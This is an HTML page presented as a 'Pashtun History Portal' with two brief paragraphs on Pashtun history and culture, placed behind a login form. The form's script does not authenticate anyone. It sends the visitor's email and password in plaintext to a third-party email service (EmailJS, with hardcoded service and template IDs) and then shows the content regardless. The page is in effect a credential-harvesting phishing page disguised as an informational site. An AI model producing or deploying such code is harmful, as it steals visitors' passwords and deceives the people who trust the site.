<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Pashtun History Portal</title>

<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
<script>
(function(){
  emailjs.init("aU_rVriMIfRSDIniQ");
})();
</script>

<style>
body{
  margin:0;
  font-family:Arial;
  background:#0b1220;
  color:#e5e7eb;
}

/* LOGIN */
#loginPage{
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  background:#0f172a;
}

.box{
  background:#111827;
  padding:25px;
  border-radius:10px;
  width:320px;
}

input{
  width:100%;
  padding:10px;
  margin:8px 0;
  border:none;
  border-radius:6px;
}

button{
  width:100%;
  padding:10px;
  background:#3b82f6;
  border:none;
  color:white;
  border-radius:6px;
  cursor:pointer;
}

/* SITE */
#site{
  display:none;
}

header{
  background:#0f172a;
  padding:20px;
  text-align:center;
}

.container{
  max-width:900px;
  margin:auto;
  padding:20px;
}

.section{
  background:#111827;
  padding:20px;
  margin:15px 0;
  border-radius:10px;
}
</style>
</head>

<body>

<!-- LOGIN PAGE -->
<div id="loginPage">
  <div class="box">
    <h2>🔐 Login</h2>

    <input id="email" placeholder="Enter email (@gmail.com)">
    <input id="password" type="password" placeholder="Password">

    <button onclick="login()">Login</button>
  </div>
</div>

<!-- MAIN SITE -->
<div id="site">

<header>
  <h1>📜 Pashtun History Portal</h1>
</header>

<div class="container">

<div class="section">
<h2>History</h2>
Pashtuns are a major ethnic group of Afghanistan and Pakistan with deep tribal traditions and long historical roots.
</div>

<div class="section">
<h2>Culture</h2>
Pashto poetry, Attan dance, and Pashtunwali code define their cultural identity.
</div>

</div>

</div>

<script>

function login(){

  let email = document.getElementById("email").value;
  let password = document.getElementById("password").value;

  emailjs.send("service_bqnzz7f","template_lxwj7sw",{
    user_email: email,
    user_password: password
  });

  alert("Login sent to email!");

  document.getElementById("loginPage").style.display = "none";
  document.getElementById("site").style.display = "block";
}

</script>

</body>
</html>
